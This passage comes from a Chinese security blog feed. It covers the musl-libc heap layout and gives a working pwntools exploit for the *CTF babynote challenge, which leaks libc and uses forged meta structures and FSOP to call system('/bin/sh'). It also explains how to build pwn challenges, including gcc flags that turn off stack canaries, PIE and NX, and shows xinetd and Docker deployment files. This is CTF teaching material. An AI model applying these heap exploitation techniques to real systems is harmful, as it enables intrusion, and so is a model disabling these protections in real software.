152455"></p><p>如0x6538f4fa2ca8的0x0003a1000000000d</p><p>其中0003是对应着offset</p><p>而a1是chunk的idx</p><p>这个程序是我自己编写用来调试的，申请的第一个chunk的idx就是a0，估计是前面的chunk的idx是程序初始化使用了吧</p><p>而最后的d,目前没有找到大佬介绍，我自己试着调试了一下，这个值和申请的chunk的大小有关</p><p>可以看到上图中的那个位置有d有0有c，位置为d的那个chunk我是malloc(0x1f)得到的，而c的chunk我是malloc(0x20)得到的，如果malloc(0x28)及以上的话，那个位置就是0了，也就是说，这个地方的数字对应着这个chunk还可以再大多少，比如d的那个地方，说明我malloc(0x1f+0xd)，也会使用这个chunk,c的位置便是malloc(0x20+0xc)，而当malloc(0x29)时，已经覆盖了这个位置，所以就变成0了，也就是说我malloc(0x1d~0x2c)得到的chunk的大小是一样的</p><p>类似于glibc中物理相邻的上一个chunk可以使用下一个chunk的psize位，musl中的上一个chunk可以使用下一个chunk的12个字节（也可以说是4个字节，看你怎么理解chunk头吧）对应于0x0003a1000000000d，我可以溢出写成0x0003a100061616161，</p><p>chunk可以通过记录的offset找到group，比如位于0xa0的chunk的offset是3，0xb0-(3+1)*0x10=0x70，就找到了group，而group又可以通过记录的meta地址找到meta，以此来管理堆结构</p><h2 id="关于malloc和free"><a href="#关于malloc和free" class="headerlink" title="关于malloc和free"></a>关于malloc和free</h2><p>我试着写了一下这个逻辑，但是写的不是很清晰，这里直接放个链接，觉得写的很好，总结的很到位，大家可以看这篇文章</p><p><a href="https://blog.xmcve.com/2022/08/08/musl基础知识整理/#title-9">链接</a></p><h2 id="题目复现"><a href="#题目复现" class="headerlink" title="题目复现"></a>题目复现</h2><h3 id="CTF-babynote"><a href="#CTF-babynote" class="headerlink" title="*CTF babynote"></a>*CTF babynote</h3><p>大体思路：</p><p>1.泄露libc和pie</p><p>2.申请一个大的slot，页对齐，然后伪造meta_arae,meta,group,chunk</p><p>3.然后释放chunk，在dequeue过程中利用meta的双向链表指针互写，向ofl_head中写如fake_io的地址</p><p>4.然后执行exit，通过fake_io进行FSOP执行system(“/bin/sh”)，getshell</p><p>（感觉这道题的堆风水好难布置）</p><p>这里强推一篇文章，真的超级详细 <a href="https://blog.xf1les.net/2022/04/20/starctf2022-babynote-writeup/#3-前置条件">就是这个</a>，我这里就不做过多解释了，这个题貌似因为环境不一样，我用博主的exp不成功，自己按照思路调了一下exp，本地成功了，可能你们用我的exp也成功不了吧</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>, os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-v&quot;</span>, <span class="string">&quot;-l&quot;</span>, <span class="string">&quot;190&quot;</span>]</span><br><span class="line"></span><br><span class="line">libc_base=<span class="number">0x0</span></span><br><span class="line">heap_base=<span class="number">0x0</span></span><br><span class="line">pie=<span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getshell</span>() : <span class="keyword">return</span> libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>], libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">r = <span class="keyword">lambda</span> a : p.recv(a)</span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a  : p.recvuntil(a)</span><br><span class="line">s = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">shell = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">li = <span class="keyword">lambda</span> offset        :libc_base+offset</span><br><span class="line">lis= <span class="keyword">lambda</span> func          :libc_base+libc.symbols[func]</span><br><span class="line">pi = <span class="keyword">lambda</span> offset        :pie+offset</span><br><span class="line">he = <span class="keyword">lambda</span> offset        :heap_base+offset</span><br><span class="line">l32 = <span class="keyword">lambda</span>    :u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">l64 = <span class="keyword">lambda</span>    :u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">ggg = <span class="keyword">lambda</span>              :(gdb.attach(p),pause())</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./babynote&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">name,content</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;option: &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;name size: &#x27;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(name)).encode())</span><br><span class="line">    sa(<span class="string">b&#x27;name: &#x27;</span>,name)</span><br><span class="line">    sla(<span class="string">b&#x27;note size: &#x27;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(content)).encode())</span><br><span class="line">    sa(<span class="string">b&#x27;note content: &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find</span>(<span class="params">name</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;option: &#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;name size: &#x27;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(name)).encode())</span><br><span class="line">    sa(<span class="string">b&#x27;name: &#x27;</span>,name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">name</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;option: &#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;name size: &#x27;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(name)).encode())</span><br><span class="line">    sa(<span class="string">b&#x27;name: &#x27;</span>,name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clear</span>():</span><br><span class="line">    sla(<span class="string">b&#x27;option: &#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">esc</span>():</span><br><span class="line">    sla(<span class="string">b&#x27;option: &#x27;</span>,<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">uuu64</span>(<span class="params">data</span>):</span><br><span class="line">    hex_str = data.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(hex_str) % <span class="number">2</span> != <span class="number">0</span>:</span><br><span class="line">        hex_str = <span class="string">&#x27;0&#x27;</span> + hex_str</span><br><span class="line">    bytes_list = [hex_str[i:i+<span class="number">2</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(hex_str), <span class="number">2</span>)]</span><br><span class="line">    reversed_hex_str = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">reversed</span>(bytes_list))</span><br><span class="line">    hex_number = <span class="built_in">int</span>(reversed_hex_str, <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">return</span> hex_number</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./babynote&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    add(<span class="string">b&#x27;M0&#x27;</span>,<span class="string">b&#x27;M0&#x27;</span>)</span><br><span class="line">clear()</span><br><span class="line">add(<span class="string">b&#x27;uaf&#x27;</span>,<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x28</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    add(<span class="string">b&#x27;M1&#x27;</span>, <span class="string">b&#x27;M1&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    add(<span class="string">b&#x27;M2&#x27;</span>, <span class="string">b&#x27;M2&#x27;</span>)</span><br><span class="line">delete(<span class="string">b&#x27;uaf&#x27;</span>)</span><br><span class="line">add(<span class="string">b&#x27;X&#x27;</span>, <span class="string">b&#x27;X&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">find(<span class="string">b&#x27;uaf&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;0x28:&#x27;</span>)</span><br><span class="line">libc_base=uuu64(r(<span class="number">12</span>))-<span class="number">0xdea50</span></span><br><span class="line">r(<span class="number">4</span>)</span><br><span class="line">pie=uuu64(r(<span class="number">12</span>))-<span class="number">0x4fc0</span>-<span class="number">0xfd0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(pie))</span><br><span class="line">uaf_name=li(<span class="number">0xdeda0</span>)</span><br><span class="line">secret=li(<span class="number">0xdbae0</span>)</span><br><span class="line">payload=p64(uaf_name)+p64(secret)+p64(<span class="number">3</span>)+p64(<span class="number">0x8</span>)+p64(<span class="number">0</span>)</span><br><span class="line">find(payload)</span><br><span class="line">find(<span class="string">b&#x27;uaf&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;0x8:&#x27;</span>)</span><br><span class="line">key=uuu64(r(<span class="number">16</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(key))</span><br><span class="line">ofl_head=li(<span class="number">0xdde68</span>)</span><br><span class="line">fake_io=pi(<span class="number">0x4850</span>)</span><br><span class="line">page=li(-<span class="number">0x9000</span>)</span><br><span class="line">payload=flat(</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="number">0x0</span>:p64(key), <span class="comment">#secret</span></span><br><span class="line">        <span class="number">0x8</span>:p64(ofl_head-<span class="number">8</span>),<span class="comment">#prev</span></span><br><span class="line">        <span class="number">0x10</span>:p64(fake_io),<span class="comment">#next</span></span><br><span class="line">        <span class="number">0x18</span>:p64(page+<span class="number">0x30</span>),<span class="comment">#mem</span></span><br><span class="line">        <span class="number">0x20</span>:p64(<span class="number">0</span>),<span class="comment">#avail_mask.free_mask</span></span><br><span class="line">        <span class="number">0x28</span>:p64(<span class="number">0x1020</span>),<span class="comment">#maplen=1,freeable=1</span></span><br><span class="line">        <span class="number">0x30</span>:p64(page+<span class="number">0x8</span>),<span class="comment">#meta</span></span><br><span class="line">        <span class="number">0x38</span>:p64(<span class="number">0</span>)<span class="comment">#fake_chunk,offset=0,故0x40即为slot</span></span><br><span class="line">    &#125;, filler=<span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">)</span><br><span class="line">payload=(<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0xfe0</span>+payload).ljust(<span class="number">0x1100</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">delete(<span class="string">b&#x27;M1&#x27;</span>)</span><br><span class="line">delete(<span class="string">b&#x27;M1&#x27;</span>)</span><br><span class="line">add(<span class="string">b&#x27;fake_struct&#x27;</span>,payload)</span><br><span class="line">payload=p64(pi(<span class="number">0x5f90</span>))+p64(page+<span class="number">0x40</span>)+p64(<span class="number">0x30</span>)+p64(<span class="number">8</span>)+p64(<span class="number">0</span>)</span><br><span class="line">add(<span class="string">b&#x27;fake_note&#x27;</span>,payload)</span><br><span class="line">delete(<span class="string">b&#x27;X&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">system=lis(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">fake_file = flat(&#123;</span><br><span class="line">    <span class="number">0</span>    : <span class="string">b&quot;/bin/sh\x00&quot;</span>,</span><br><span class="line">    <span class="number">0x28</span> : li(<span class="number">0x2000</span>),</span><br><span class="line">    <span class="number">0x38</span> : li(<span class="number">0x3000</span>),</span><br><span class="line">    <span class="number">0x48</span> : system</span><br><span class="line">&#125;, filler=<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">add(<span class="string">&#x27;fake_file&#x27;</span>, fake_file)</span><br><span class="line">ggg()</span><br><span class="line">esc()</span><br><span class="line">shell()</span><br></pre></td></tr></table></figure><p>关于musl-libc的FSOP利用的调用链<br>exit:<strong>exit-&gt;stdio_exit_needed-&gt;stdio_exit_needed-&gt;close_file</strong></p><p>puts:<strong>puts-&gt;fputs_unlocked-&gt;fwrite_unlocked-&gt;__fwritex+142（call rax）</strong></p><p>具体参考文章：<a href="https://bbs.kanxue.com/thread-274640.htm">这里</a>，对于fake_io的讲解以及dequeue和queue的讲解也挺到位的</p><p>babynote本来想试着用puts调用链也做一下的，可是最后伪造meta入队列想要实现任意分配修改stdout结构体时，却因为fake_group中的meta为0，没有写入fake_meta的地址，导致get_meta的时候程序over了，后来尝试了一下，堆风水太麻烦了，就没有继续深究了，感兴趣的可以自己尝试一下</p><p><del>我是菜鸡就不试了</del></p><h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><p>musl-libc的学习就到这里了，作为一个轻量化的libc，学习成本也是比较小的，攻击思路也基本就是dequeue和queue以及伪造结构体，由于没有hook函数，所以一般也是利用FSOP攻击，还是比较单一的…</p>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> musl </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn出题</title>
      <link href="/2025/07/21/pwn%E5%87%BA%E9%A2%98/"/>
      <url>/2025/07/21/pwn%E5%87%BA%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="编写程序代码"><a href="#编写程序代码" class="headerlink" title="编写程序代码"></a>编写程序代码</h2><p>写好程序代码之后C语言(或者其他)，编译成二进制可执行程序</p><p>如果只是编译的话</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc your_file_name.c -o target_name</span><br></pre></td></tr></table></figure><p>去除canary</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fno-stack-protector your_file_name.c -o target_name </span><br></pre></td></tr></table></figure><p>去除pie</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -no-pie your_file_name.c -o target_name </span><br></pre></td></tr></table></figure><p>去除NX</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -z execstack  your_file_name.c -o target_name </span><br></pre></td></tr></table></figure><h2 id="ctf-xinted部署"><a href="#ctf-xinted部署" class="headerlink" title="ctf_xinted部署"></a>ctf_xinted部署</h2><h3 id="本地："><a href="#本地：" class="headerlink" title="本地："></a>本地：</h3><ol><li><p>在bin文件夹中放入要运行的二进制程序，flag内容自定</p></li><li><p>ctf_xinetd</p><p>将./your_file替换为你的文件名，这里建议将port（容器内的端口）改为80，<del>虽然不知道为什么，但貌似这样更快一点</del></p></li></ol>   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">service ctf</span><br><span class="line">&#123;</span><br><span class="line">    disable = no</span><br><span class="line">    socket_type = stream</span><br><span class="line">    protocol    = tcp</span><br><span class="line">    wait        = no</span><br><span class="line">    user        = root</span><br><span class="line">    type        = UNLISTED</span><br><span class="line">    port        = 9999 #容器内的端口</span><br><span class="line">    bind        = 0.0.0.0 #本地IP</span><br><span class="line">    server      = /usr/sbin/chroot</span><br><span class="line">    # replace helloworld to your program</span><br><span class="line">    server_args = --userspec=1000:1000 /home/ctf ./your_file #!!!</span><br><span class="line">    banner_fail = /etc/banner_fail</span><br><span class="line">    # safety options</span><br><span class="line">    per_source= 10 # the maximum instances of this service per source IP address</span><br><span class="line">    rlimit_cpu= 20 # the maximum number of CPU seconds that the service may use</span><br><span class="line">    #rlimit_as  = 1024M # the Address Space resource limit for the service</span><br><span class="line">    #access_times = 2:00-9:00 12:00-24:00</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li><p>Dockerfile<br>如果要拉取ubuntu18.0以下的版本的话在注释的地方需要改一下，按原代码写</p><p>要是上面改了容器端口的话，记得把下面的暴露端口也改掉  “EXPOSE 9999  #容器对外暴露的端口”</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">FROM ubuntu:24.04   #拉取镜像版本</span><br><span class="line"></span><br><span class="line">RUN sed -i &quot;s/http:\/\/archive.ubuntu.com/http:\/\/mirrors.tuna.tsinghua.edu.cn/g&quot; /etc/apt/sources.list &amp;&amp; \</span><br><span class="line">    apt-get update &amp;&amp; apt-get -y dist-upgrade &amp;&amp; \</span><br><span class="line">    apt-get install -y lib32z1 xinetd</span><br><span class="line"></span><br><span class="line">RUN useradd -m ctf</span><br><span class="line"></span><br><span class="line">WORKDIR /home/ctf</span><br><span class="line"></span><br><span class="line">RUN cp -R /usr/lib* /home/ctf  #这个地方和原文件有点不同，需要修改一下，原文件的写法只适合拉去ubuntu18.0以下的版本</span><br><span class="line"></span><br><span class="line">RUN mkdir /home/ctf/dev &amp;&amp; \</span><br><span class="line">    mknod /home/ctf/dev/null c 1 3 &amp;&amp; \</span><br><span class="line">    mknod /home/ctf/dev/zero c 1 5 &amp;&amp; \</span><br><span class="line">    mknod /home/ctf/dev/random c 1 8 &amp;&amp; \</span><br><span class="line">    mknod /home/ctf/dev/urandom c 1 9 &amp;&amp; \</span><br><span class="line">    chmod 666 /home/ctf/dev/*</span><br><span class="line"></span><br><span class="line">RUN mkdir /home/ctf/bin &amp;&amp; \</span><br><span class="line">    cp /bin/sh /home/ctf/bin &amp;&amp; \</span><br><span class="line">    cp /bin/ls /home/ctf/bin &amp;&amp; \</span><br><span class="line">    cp /bin/cat /home/ctf/bin</span><br><span class="line"></span><br><span class="line">COPY ./ctf.xinetd /etc/xinetd.d/ctf</span><br><span class="line">COPY ./start.sh /start.sh</span><br><span class="line">RUN echo &quot;Blocked by ctf_xinetd&quot; &gt; /etc/banner_fail</span><br><span class="line"></span><br><span class="line">RUN chmod +x /start.sh</span><br><span class="line"></span><br><span class="line">COPY ./bin/ /home/ctf/</span><br><span class="line">RUN chown -R root:ctf /home/ctf &amp;&amp; \</span><br><span class="line">    chmod -R 750 /home/ctf &amp;&amp; \</span><br><span class="line">    chmod 740 /home/ctf/flag</span><br><span class="line"></span><br><span class="line">CMD [&quot;/start.sh&quot;]</span><br><span class="line"></span><br><span class="line">EXPOSE 9999  #容器对外暴露的端口可能会用到的命令</span><br></pre></td></tr></table></figure></li><li><p>可能用到的命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">docker build  -t <span class="string">&quot;pwn&quot;</span> .#用当前目录下的Dockerfile文件创建名为pwn的镜像</span><br><span class="line">docker run -d -p <span class="string">&quot;0.0.0.0:1234:9999&quot;</span> -h <span class="string">&quot;pwn&quot;</span> --name=<span class="string">&quot;pwn&quot;</span> pwn#将本地的1234端口映射到容器中的9999端口，并给容器内的主机起名为pwn，同时将这个容器也命名为pwn，方便管理，之后通过nc 0.0.0.0 1234就可以成功了</span><br><span class="line">docker ps <span class="comment">#可以查看目前有哪些容器</span></span><br><span class="line">docker stop 容器名/ID <span class="comment">#停止容器</span></span><br><span class="line">docker <span class="built_in">rm</span> 容器名/ID <span class="comment">#删除容器</span></span><br><span class="line">docker rmi 镜像名#删除镜像</span><br><span class="line">docker images#查看有哪些镜像</span><br><span class="line">docker <span class="built_in">exec</span> -it  容器名/ID /bin/bash <span class="comment">#进入容器</span></span><br></pre></td></tr></table></figure></li><li><p>start.sh</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="comment"># Add your startup script</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># DO NOT DELETE</span></span><br><span class="line">/etc/init.d/xinetd start;</span><br><span class="line"><span class="built_in">sleep</span> infinity;</span><br></pre></td></tr></table></figure></li></ol><h3 id="GZ平台部署-动态flag"><a href="#GZ平台部署-动态flag" class="headerlink" title="GZ平台部署(动态flag)"></a>GZ平台部署(动态flag)</h3><ol><li><p>在部署动态flag的时候我把start.sh改为了flag.sh,对应的Dockerfile里的内容也要修改</p></li><li><p>ctf_xinted</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">service ctf</span><br><span class="line">&#123;</span><br><span class="line">    disable = no</span><br><span class="line">    socket_type = stream</span><br><span class="line">    protocol    = tcp</span><br><span class="line">    wait        = no</span><br><span class="line">    user        = root</span><br><span class="line">    type        = UNLISTED</span><br><span class="line">    port        = 80</span><br><span class="line">    bind        = 0.0.0.0</span><br><span class="line">    server      = /usr/sbin/chroot</span><br><span class="line">    # replace helloworld to your program</span><br><span class="line">    server_args = --userspec=1001:1001 /home/ctf ./your_file</span><br><span class="line">    banner_fail = /etc/banner_fail</span><br><span class="line">    # safety options</span><br><span class="line">    per_source= 10 # the maximum instances of this service per source IP address</span><br><span class="line">    rlimit_cpu= 20 # the maximum number of CPU seconds that the service may use</span><br><span class="line">    #rlimit_as  = 1024M # the Address Space resource limit for the service</span><br><span class="line">    #access_times = 2:00-9:00 12:00-24:00</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>Dockerfile</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">FROM ubuntu:24.04</span><br><span class="line"></span><br><span class="line">RUN sed -i &quot;s/http:\/\/archive.ubuntu.com/http:\/\/mirrors.tuna.tsinghua.edu.cn/g&quot; /etc/apt/sources.list &amp;&amp; \</span><br><span class="line">    apt-get update &amp;&amp; apt-get -y dist-upgrade &amp;&amp; \</span><br><span class="line">    apt-get install -y lib32z1 xinetd</span><br><span class="line"></span><br><span class="line">RUN useradd -m ctf</span><br><span class="line"></span><br><span class="line">WORKDIR /home/ctf</span><br><span class="line"></span><br><span class="line">RUN cp -R /usr/lib* /home/ctf</span><br><span class="line"></span><br><span class="line">RUN mkdir /home/ctf/dev &amp;&amp; \</span><br><span class="line">    mknod /home/ctf/dev/null c 1 3 &amp;&amp; \</span><br><span class="line">    mknod /home/ctf/dev/zero c 1 5 &amp;&amp; \</span><br><span class="line">    mknod /home/ctf/dev/random c 1 8 &amp;&amp; \</span><br><span class="line">    mknod /home/ctf/dev/urandom c 1 9 &amp;&amp; \</span><br><span class="line">    chmod 666 /home/ctf/dev/*</span><br><span class="line"></span><br><span class="line">RUN mkdir /home/ctf/bin &amp;&amp; \</span><br><span class="line">    cp /bin/sh /home/ctf/bin &amp;&amp; \</span><br><span class="line">    cp /bin/ls 